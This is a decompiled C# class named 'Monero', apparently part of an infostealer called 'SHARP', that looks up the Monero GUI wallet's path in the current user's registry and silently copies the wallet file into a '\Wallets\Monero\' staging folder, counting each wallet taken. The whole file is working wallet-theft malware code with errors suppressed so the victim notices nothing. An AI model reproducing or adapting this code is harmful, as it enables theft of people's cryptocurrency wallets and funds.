﻿using System;
using System.IO;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x02000037 RID: 55
	internal class Monero
	{
		// Token: 0x06000109 RID: 265 RVA: 0x0000639C File Offset: 0x0000459C
		public static void XMRcoinStr(string directorypath)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
				Directory.CreateDirectory(directorypath + Monero.base64xmr);
				string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
				Directory.CreateDirectory(directorypath + Monero.base64xmr);
				File.Copy(text, directorypath + Monero.base64xmr + text.Split(new char[]
				{
					'\\'
				})[text.Split(new char[]
				{
					'\\'
				}).Length - 1]);
				Monero.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000085 RID: 133
		public static int count = 0;

		// Token: 0x04000086 RID: 134
		public static string base64xmr = "\\Wallets\\Monero\\";
	}
}
